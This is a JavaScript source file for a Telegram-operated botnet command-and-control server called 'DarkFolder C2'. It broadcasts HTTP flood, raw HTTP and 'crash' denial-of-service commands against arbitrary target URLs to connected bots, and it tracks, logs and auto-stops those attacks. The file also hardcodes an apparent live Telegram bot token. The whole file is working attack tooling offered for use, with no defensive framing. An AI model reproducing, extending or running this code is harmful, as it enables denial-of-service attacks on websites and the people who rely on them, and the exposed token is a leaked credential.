const TelegramBot = require('node-telegram-bot-api');
const { server, broadcastCommand, getConnectedTerminals } = require('./handler');
const fs = require('fs');
const token = '8165242316:AAFCmOaW_DX57LTw6AXhprVYdlgaVzHSIOY';
const bot = new TelegramBot(token, { polling: true });
const PORT = 1111;
const LOG_FILE = 'logs.txt';
let currentAttack = null;
let attackTimer = null;

server.listen(PORT, () => {
  console.log(`⚡ C2 Server running on port ${PORT}`);
});

function logAction(action) {
  const logEntry = `${new Date().toISOString()} - ${action}\n`;
  fs.appendFileSync(LOG_FILE, logEntry);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '👋 Welcome to DarkFolder C2! Use /help to see commands.');
});

bot.onText(/\/help/, (msg) => {
  const helpText = `📖 *Available Commands* 📖

⚡ Attack Methods:
/httpfuck <url> <time> - HTTP Raw attack
/crash <url> <GET/POST> - Crash target
/httpflood <url> <threads> <GET/POST> <time> - HTTP Flood

🔧 Utilities:
/stop - 🛑 Stop all attacks
/ongoing - 🔥 View ongoing attack
/logs - 📜 View attack logs
/methods - 📡 Show attack methods
/terminal - 💻 List connected terminals`;
  bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

bot.onText(/\/methods/, (msg) => {
  const text = `📡 *Available Methods* 📡
  
- HTTP-RAW (Layer7)
- Crash (Layer7)
- HTTPFlood (Layer7)`;
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

bot.onText(/\/terminal/, (msg) => {
  const terminals = getConnectedTerminals();
  const list = terminals.length ? terminals.map(t => `💻 ${t}`).join('\n') : '❌ No terminals connected';
  bot.sendMessage(msg.chat.id, `🖥️ *Connected Terminals* 🖥️\n${list}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/logs/, (msg) => {
  const logs = fs.existsSync(LOG_FILE) ? fs.readFileSync(LOG_FILE, 'utf8') : '📜 No logs yet';
  bot.sendMessage(msg.chat.id, `📄 *Attack Logs* 📄\n\`\`\`\n${logs}\n\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/ongoing/, (msg) => {
  if (currentAttack) {
    const elapsed = Math.floor((Date.now() - currentAttack.startTime) / 1000);
    const minutes = Math.floor(elapsed / 60);
    const seconds = elapsed % 60;
    bot.sendMessage(msg.chat.id, 
      `🔥 *Ongoing Attack* 🔥\n` +
      `🛠 Method: ${currentAttack.method}\n` +
      `⏱ Duration: ${minutes}m ${seconds}s\n` +
      `⏳ Time Left: ${Math.floor((currentAttack.endTime - Date.now()) / 1000)}s\n` +
      `📡 Command: \`${currentAttack.cmd}\``,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(msg.chat.id, '✅ No ongoing attacks');
  }
});

bot.onText(/\/stop/, (msg) => {
  broadcastCommand('stop');
  currentAttack = null;
  if (attackTimer) clearTimeout(attackTimer);
  logAction('All attacks stopped');
  bot.sendMessage(msg.chat.id, '🛑 All attacks stopped successfully');
});

function handleAttack(msg, method, cmdText) {
  const chatId = msg.chat.id;
  if (currentAttack) {
    return bot.sendMessage(chatId, '⚠️ Attack already running! Use /stop first');
  }
  
  broadcastCommand(cmdText);
  currentAttack = {
    method: method.toUpperCase(),
    cmd: cmdText,
    startTime: Date.now(),
    endTime: Date.now() + 120000
  };
  
  logAction(`Attack started: ${cmdText}`);
  bot.sendMessage(chatId, `🚀 Attack launched!\n⌛ Auto-stop in 120 seconds\n\`${cmdText}\``, 
    { parse_mode: 'Markdown' });
  
  attackTimer = setTimeout(() => {
    broadcastCommand('stop');
    currentAttack = null;
    logAction('Attack auto-stopped');
    bot.sendMessage(chatId, '🕒 Attack automatically stopped after 2 minutes');
  }, 120000);
}

bot.on('message', (msg) => {
  const text = msg.text;
  if (!text) return;

  if (text.startsWith('/httpfuck ')) {
    const parts = text.split(' ');
    if (parts.length < 3) return bot.sendMessage(msg.chat.id, '❌ Usage: /httpfuck <url> <time>');
    handleAttack(msg, 'http-raw', `http-raw ${parts[1]} ${parts[2]}`);
  }
  else if (text.startsWith('/crash ')) {
    const parts = text.split(' ');
    if (parts.length < 3) return bot.sendMessage(msg.chat.id, '❌ Usage: /crash <url> <GET/POST>');
    handleAttack(msg, 'crash', `crash ${parts[1]} ${parts[2]}`);
  }
  else if (text.startsWith('/httpflood ')) {
    const parts = text.split(' ');
    if (parts.length < 5) return bot.sendMessage(msg.chat.id, '❌ Usage: /httpflood <url> <threads> <GET/POST> <time>');
    handleAttack(msg, 'httpflood', `httpflood ${parts[1]} ${parts[2]} ${parts[3]} ${parts[4]}`);
  }
});